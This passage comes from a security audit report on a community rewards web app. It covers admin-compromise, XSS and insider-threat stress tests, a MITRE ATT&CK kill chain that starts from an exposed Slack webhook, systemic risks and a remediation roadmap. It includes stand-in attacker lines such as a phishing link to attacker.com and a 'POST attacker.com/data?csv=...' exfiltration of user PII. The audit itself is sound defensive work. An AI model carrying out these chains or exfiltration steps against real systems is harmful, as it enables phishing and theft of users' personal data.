- Total: $100–1000 (ops) + inventory restocking cost.

**Attacker effort:** Automated signup script; hours of execution.

---

## 9. RBAC Stress Test: CORE+FULL_ACCESS Compromise

**Assumption:** All CORE+FULL_ACCESS superadmin accounts are compromised.

**Capabilities:**
- `POST /api/wallet/adjust` → mint unlimited points for any user (including attacker).
- `PUT /api/members/[id]/permissions` → grant themselves FULL_ACCESS (if not already); escalate co-conspirators.
- `GET /api/admin/public-users` + `GET /api/speedrun/registrations/export` → bulk export PII.
- `POST /api/admin/send-email` → send emails to all users via org SMTP.
- `DELETE /api/quests/[id]`, `DELETE /api/bounty/[id]` → delete community content.
- Access to AuditLog: soft-delete capability to cover tracks.

**Blast radius:**
- Economy: Unlimited point minting; swag drained.
- Privacy: Full PII export.
- Operations: Mass email / spam.
- Integrity: Content deleted, audit logs tampered.

**Detection:**
- Per Cat 7 Check 9: "No access-review tooling."
- Per Cat 25: "No anomaly detection."
- Verdict: **Near-undetectable until inventory crash or user complaints.**

**Separation of duties:**
- Per Threat Model §2.5: "No separation of duties exists — one person with FULL_ACCESS can grant points to themselves and approve their own quest in one session, with no second-admin sign-off in code."
- Verdict: **No procedural gate; technically possible to prevent via approval workflow, but not implemented.**

---

## 10. Panel-Isolation Stress Test: XSS → Admin Compromise

**Assumption:** One malicious script (XSS payload) executes in a CORE admin's browser session while they are viewing the admin panel (`/core/*`).

**Capabilities of XSS:**
- Cannot read `__Secure-next-auth.session-token` cookie (HttpOnly).
- **Can** make `fetch()` requests as the admin, because requests include the cookie automatically.
- **Can** call any `/api/*` endpoint as the admin.
- **Can** display a fake login form or alert, phishing the admin's password (unlikely to work with Google OAuth, but admin might re-authenticate).

**Attacks XSS can perform:**
- `PUT /api/members/[peer-id]/permissions` → escalate a peer to FULL_ACCESS.
- `POST /api/wallet/adjust` → mint points.
- `GET /api/admin/public-users` → exfiltrate PII via XSS → attacker's URL.
- `POST /api/admin/send-email` → send mail as org (if endpoint exists and is callable).

**Verdict:** **All admin actions performable; HttpOnly cookie blocks direct token theft, but session-hijacking via XSS is complete.**

**Mitigation gap:** [Cat 5 Check 1](05-panel-isolation.md#-check-1-admin-panel-on-same-origin--shared-cookies--shared-localstorage) — "No separate admin subdomain. All admin, member, and public surfaces share JWT cookie, bundle, and API layer. **Blast radius on any client-side vulnerability (XSS) affects all roles.**"

---

## 11. Insider-Threat Stress Test: Malicious CORE Admin, Legitimate Access

**Assumption:** A CORE+FULL_ACCESS admin is malicious and wants to:
1. Maximize personal financial gain (mint points, redeem swag).
2. Maximize secrecy (undetectable extraction).

**Damage:**
- Same as compromised admin (Chain B, above).
- But with complete legitimacy: all actions are authorized by their permissions.

**Detection:**
- Admin login: **not audited** → attacker can log in at 3 AM with zero alert.
- Wallet adjust: **not audited** → attacker mints 10K points with zero trail.
- Points spend: **logged only in WalletTransaction** (operational log, not formal audit).
- AuditLog: **soft-deletable** → attacker can prune if DB access available.

**Verdict:**
- Damage: **Same as compromised (unbounded).**
- Detection: **Near-zero without anomaly detection.** Only discovered via:
  - Inventory crash (swag depleted).
  - A co-admin noticing unusual activity.
  - Historical AuditLog analysis (if they didn't prune it).

---

## 12. Kill-Chain Mapping: Slack Webhook → MITRE ATT&CK

**Top Critical finding:** Slack webhook exposed in client bundle (Cat 16 Finding 1).

**Kill chain:**

1. **Reconnaissance (T1592: Gather Victim Identity Information)**
   - Attacker loads homepage, inspects HTML/JS → discovers `NEXT_PUBLIC_SLACK_WEBHOOK_URL`.
   - Evidence: [lib/alertNotifications.ts:32](../../../lib/alertNotifications.ts#L32) exposes URL directly.

2. **Resource Development (T1583: Acquire Infrastructure)**
   - Attacker sets up phishing server (attacker.com/fake-verify).
   - Evidence: No rate-limit on Slack webhook POST.

3. **Initial Access (T1566: Phishing)**
   - Attacker POSTs to Slack webhook with phishing message: "@channel Security alert, verify access: attacker.com/fake-verify".
   - Evidence: Webhook accepts anonymous POST; no signature verification.
   - Control gap: No authentication on Slack webhook POST.

4. **Execution (T1204: User Execution)**
   - Team members click the phishing link in Slack.
   - Evidence: Message appears to be internal; high trust.
   - Control gap: No training or message verification.

5. **Credential Access (T1110: Brute Force) / (T1056: Input Capture)**
   - Attacker's phishing site captures Google/company credentials.
   - Evidence: Fake login form on attacker.com.
   - Control gap: No MFA enforcement during phishing (MFA is optional, feature-flagged).

6. **Initial Access (Repeat) (T1110)**
   - Attacker uses harvested credentials to log into team1-india app.
   - Evidence: Google OAuth accepts any Google account.
   - Control gap: No secondary verification (e.g., unusual device alert).

7. **Persistence (T1547: Boot or Logon Autostart)**
   - Attacker logs in, escalates permissions via [Cat 3 Chain B](###-chain-b-core-user-with-partial-permissions-self-promotes-to-fullaccess).
   - Evidence: No audit on login or permission change.
   - Control gap: No tokenVersion; 30-day JWT lasts.

8. **Privilege Escalation (T1548)**
   - Attacker uses FULL_ACCESS to call `PUT /api/members/[id]/permissions` with own ID.
   - Evidence: [Cat 3 Check 9](03-vertical-escalation.md#check-9-org-admin-granting-global-admin-self-elevation).
   - Control gap: No self-targeting check.

9. **Defense Evasion (T1562: Impair Defenses)**
   - Attacker soft-deletes AuditLog rows covering the escalation.
   - Evidence: [AuditLog.deletedAt](../../../prisma/schema.prisma) allows soft-delete.
   - Control gap: No database constraint preventing deletion.

10. **Discovery (T1087: Account Discovery) / (T1580: Cloud Infrastructure Discovery)**
    - Attacker enumerates all users via `GET /api/admin/public-users`.
    - Evidence: No rate-limit on admin queries.
    - Control gap: No rate-limit per admin.

11. **Collection (T1115: Gather Victim Network Information) / (T1530: Data from Cloud Storage)**
    - Attacker exports speedrun registrations: `GET /api/speedrun/registrations/export?runId=X`.
    - Evidence: [app/api/speedrun/registrations/export/route.ts:8–103](../../../app/api/speedrun/registrations/export/route.ts#L8-L103).
    - Control gap: No audit log on export.

12. **Exfiltration (T1041: Exfiltration Over C2 Channel)**
    - Attacker downloads CSV with 10K user emails, phones, cities, GitHub handles.
    - Attacker sends to external server: `POST attacker.com/data?csv=...`.
    - Evidence: No DLP (data loss prevention) tools.
    - Control gap: No egress filtering.

13. **Impact (T1561: Disk Wipe) / (T1531: Account Access Removal)**
    - Attacker deletes/modifies user accounts or locks out legit admins.
    - Evidence: Attacker has FULL_ACCESS; no approval gate.
    - Control gap: No break-glass mode.

**Summary:**
- **Kill chain succeeds entirely:** Slack webhook exposure → phishing → credential harvest → escalation → data exfil.
- **Undetected:** No audit on login, permission changes, admin queries, or export.
- **Root cause:** Public Slack webhook (design choice) + no authentication layer on Slack endpoint.

---

## Summary of Critical Systemic Risks

1. **No idempotency:** Points operations vulnerable to race conditions. [Cat 30 Assumption 1](30-zero-day-mindset.md#1-same-request-twice-retry-double-click-back-button--verdict-vulnerable).

2. **No rate limits on sensitive operations:** Admin actions and Sybil signup unmetered. [Cat 7 Check 8](07-admin-actions.md#check-8-no-admin-rate-limits), [Cat 22 Finding 1](22-anti-abuse.md#finding-1-no-captcha-anywhere-open-signup-to-sybil-farms).

3. **No audit log on critical actions:** Login, permission changes, wallet ops, exports invisible. [recon-13 §4](recon-13-logging-tests.md).

4. **Audit log is soft-deletable:** Attacker can prune trails after compromise. [Cat 1 Check 9](01-rbac-core.md#check-9-role-escalation-audit-trail-forgeable--prunable).

5. **30-day JWT with no revocation:** Fired admins retain access; no tokenVersion counter. [Cat 1 Check 8](01-rbac-core.md#check-8-role-downgrade-not-invalidating-old-jwts).

6. **Soft-deleted users bypass re-entry check:** Offboarded employees can log back in. [Cat 3 Check 27](03-vertical-escalation.md#check-27-soft-delete-check-missing-in-signin-callback).

7. **CSP allows unsafe-eval + unsafe-inline:** XSS payloads execute; no strong defense. [Cat 10 Finding 2](10-edge-gateway.md#finding-2-content-security-policy--unsafe-script--style-directives).

8. **Admin and member surfaces share origin:** Single XSS → all admin sessions hijackable. [Cat 5 Check 1](05-panel-isolation.md#-check-1-admin-panel-on-same-origin--shared-cookies--shared-localstorage).

9. **No RLS in database:** DB access = complete data read. [Cat 8](08-multi-tenant.md) (not multi-tenant, but same principle).

10. **CRON_SECRET shared across 7 jobs:** Single leak = economy + email + speedrun DoS. [Cat 9 Check 17](09-serverless.md#check-17--cron-functions-with-elevated-privileges-via-misconfigured-trigger).

11. **Slack webhook public:** Phishing vector into team's Slack. [Cat 10 Finding 12](10-edge-gateway.md#finding-12-slack-webhook-url-exposed-in-client-bundle).

12. **No KYC / no CAPTCHA:** Sybil farming trivial; swag inventory drained in hours. [Cat 22 Finding 1](22-anti-abuse.md#finding-1-no-captcha-anywhere-open-signup-to-sybil-farms).

---

## Remediation Roadmap Priority

### Critical (Phase 1 — This Sprint)
1. Add `deletedAt: null` filter to all soft-delete queries ([Cat 1 Check 27](01-rbac-core.md#check-27-soft-delete-check-missing-in-signin-callback)).
2. Implement `tokenVersion` counter + revocation check on privileged operations ([Cat 1 Check 8](01-rbac-core.md#check-8-role-downgrade-not-invalidating-old-jwts)).
3. Remove `AuditLog.deletedAt` or add database constraint preventing deletion ([Cat 1 Check 9](01-rbac-core.md#check-9-role-escalation-audit-trail-forgeable--prunable)).
4. Move Slack webhook to backend-only; rotate exposed webhook ([Cat 10 Finding 12](10-edge-gateway.md#finding-12-slack-webhook-url-exposed-in-client-bundle)).
5. Add `logAudit()` to wallet operations, logins, 2FA changes ([Cat 7](07-admin-actions.md)).
6. Implement idempotency keys on points/swag operations ([Cat 30 Assumption 1](30-zero-day-mindset.md#1-same-request-twice-retry-double-click-back-button--verdict-vulnerable)).

### High (Phase 2 — Next 2 Weeks)
7. Add CAPTCHA to signup and quest completion ([Cat 22 Finding 1](22-anti-abuse.md#finding-1-no-captcha-anywhere-open-signup-to-sybil-farms)).
8. Implement per-job CRON secrets + HMAC signature verification ([Cat 9 Check 17](09-serverless.md#check-17--cron-functions-with-elevated-privileges-via-misconfigured-trigger)).
9. Add admin rate limits (list, export, permission change quotas) ([Cat 7 Check 8](07-admin-actions.md#check-8-no-admin-rate-limits)).
10. Remove `unsafe-eval` + `unsafe-inline` from CSP ([Cat 10 Finding 2](10-edge-gateway.md#finding-2-content-security-policy--unsafe-script--style-directives)).
11. Implement self-targeting check on permissions endpoint ([Cat 3 Check 9](03-vertical-escalation.md#check-9-org-admin-granting-global-admin-self-elevation)).
12. Add user-based rate-limit fallback to IP-only limits ([Cat 10 Finding 5](10-edge-gateway.md#finding-5-rate-limiting-via-x-forwarded-for-header-ip-based-bypassable)).

### Medium (Phase 3 — Month 1)
13. Implement anomaly detection on login, permission changes, large exports ([Cat 7 Check 9](07-admin-actions.md#check-9-no-access-review-tooling)).
14. Add session revocation on permission change ([Cat 3 Check 10](03-vertical-escalation.md#check-10-api-key-inheriting-creators-role)).
15. Reduce admin JWT maxAge from 30 days to 8 hours + implement refresh token rotation ([Cat 5 Check 10](05-panel-isolation.md#-check-10-admin-panel-session-timeout-same-as-member)).
16. Implement IP allowlist for admin panel (Vercel Pro) ([Cat 5 Check 7](05-panel-isolation.md#-check-7-admin-panel-reachable-from-public-internet-without-ip-allowlist--vpn--mtls)).
17. Add approval workflow for high-value wallet adjustments (>100 points) ([Cat 7 Check 3](07-admin-actions.md#check-3-admin-manual-wallet-adjust-points-grant--not-logged-no-dollar-threshold)).
18. Implement SAST/SCA / Dependabot ([Cat 26](26-cicd-supply-chain.md)); [recon §2](00-RECON.md#step-2--dependencies--supply-chain)).

### Legal/Governance (Ongoing)
19. Design GDPR erasure cascade + implement right-to-access endpoint ([Threat Model §5.1](01-threat-model.md#51-gdpr-eu-users--regulation-2016679)).
20. Assess KYC requirement for bounty payouts; implement if necessary ([Threat Model §5.5](01-threat-model.md#55-aml--kyc-anti-money-laundering--know-your-customer)).
21. Implement DPA with all vendors (Google, Vercel, Cloudinary, SMTP) ([Threat Model §5](01-threat-model.md#5-regulatory-exposure)).

---

**End of Phase 3 Meta-Analysis**
